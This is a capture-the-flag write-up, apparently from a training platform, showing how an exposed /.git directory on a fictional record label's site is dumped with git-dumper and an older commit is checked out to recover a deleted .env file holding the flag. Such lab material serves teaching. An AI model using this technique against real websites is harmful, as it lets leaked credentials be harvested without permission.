---

Name: Loop & Roam Records
Difficulty: Easy
URL: https://dashboard.webverselabs-pro.com/learning-paths/junior-web-hacker/01/b-side
Description: Loop &amp; Roam was founded in a Detroit garage in 2011 by a bassist named Jovan who got tired of touring and wanted to put out his friends' records. The site is maintained by Aphra, a contract designer who was learning git when she built it. One night in February 2024 she committed a `.env` with prod credentials, noticed an hour later, ran `git rm .env`, and pushed. The deploy script `rsync`s the working tree, including the `.git/` directory, to the public web root. 

---

We find the repo at /.git and dump it
```bash
git-dumper https://0f4c804f-5330-b-side-d332a.challenges.webverselabs-pro.com/.git/ ./dump
```

Lets look at the commit history
```bash
git log

commit 9f5020d83a2ed4070693f3939dd896958e583652 (HEAD -> main)
Author: Aphra Vidler <aphra@looproam.records>
Date:   Mon Feb 12 19:48:00 2024 +0000

    readme: full pages list, deploy notes, style constraints

commit 33c55dc2a20dbe71a24531e164d1730fe6fb22e2
Author: Aphra Vidler <aphra@looproam.records>
Date:   Sat Feb 10 11:05:00 2024 +0000

    content: tour + store pages, all five routes wired

commit 312a7c6975ee0b61f272b01ccd6f274ba8c1d6ca
Author: Aphra Vidler <aphra@looproam.records>
Date:   Thu Feb 8 16:22:00 2024 +0000

    content: roster + releases pages, wire routes

commit 993a9eaa1869c0b7e0ac44059aa60d59f660114b
Author: Aphra Vidler <aphra@looproam.records>
Date:   Tue Feb 6 23:08:00 2024 +0000

    oops: remove .env from tracking + add .gitignore (DO NOT commit secrets)

commit 169045972ffc23da85f0f62b188f74d222bfed47
Author: Aphra Vidler <aphra@looproam.records>
Date:   Tue Feb 6 22:41:00 2024 +0000

    wip: wire up prod env file (TODO gitignore before next push)

commit a8624ef75cafd67365f146783001aa521adcadf8
Author: Aphra Vidler <aphra@looproam.records>
Date:   Tue Feb 6 11:08:00 2024 +0000

    home: hero with single-of-the-week, tour strip, 8-tile roster grid

commit a71ace4684057a5198eb9ce73dd1429bb4acc29d
Author: Aphra Vidler <aphra@looproam.records>
Date:   Mon Feb 5 18:41:00 2024 +0000

    templates: full base layout (sticky nav, four-col footer)

commit f4c75a9e09ffb59ff9accf3a7af5633bb010e674
Author: Aphra Vidler <aphra@looproam.records>
Date:   Mon Feb 5 15:22:00 2024 +0000

    style: design system (palette, type scale, layout primitives)

commit 5448e996a929ec96b46b5b41509373534de34d16
Author: Aphra Vidler <aphra@looproam.records>
Date:   Sun Feb 4 10:14:00 2024 +0000

    initial: flask skeleton + readme + minimal home
```

The .env file was removed in `993a9eaa1869c0b7e0ac44059aa60d59f660114b`, so we check `169045972ffc23da85f0f62b188f74d222bfed47`
```bash
commit 993a9eaa1869c0b7e0ac44059aa60d59f660114b
Author: Aphra Vidler <aphra@looproam.records>
Date:   Tue Feb 6 23:08:00 2024 +0000

    oops: remove .env from tracking + add .gitignore (DO NOT commit secrets)

commit 169045972ffc23da85f0f62b188f74d222bfed47
Author: Aphra Vidler <aphra@looproam.records>
Date:   Tue Feb 6 22:41:00 2024 +0000

    wip: wire up prod env file (TODO gitignore before next push)
```

```bash
git checkout 169045972ffc23da85f0f62b188f74d222bfed47
```

Now we have the file
```bash
$ ls -al .env
.rw-r--r--. theo theo 914 B Mon Aug 10 15:50:52 2026  .env
```

Inside it we find the flag
```
# Internal reconciliation reference — Jovan keys monthly payouts off this
INTERNAL_REF=WEBVERSE{REDACTED}
```
